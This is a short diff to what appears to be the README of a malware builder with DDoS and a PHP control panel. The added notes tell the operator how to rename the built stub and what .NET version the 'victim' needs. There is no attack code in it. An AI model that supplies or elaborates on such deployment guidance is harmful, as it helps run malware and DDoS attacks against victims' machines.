@@ -4,3 +4,7 @@
 + Light Weight
 + DDoS
 + PHP Panel
+
+# Notes
++ Stub when built must be renamed from Stub.exe to raw.stub
++ Victim must have .Net 4.8 Framework unless you downgrade both solutions
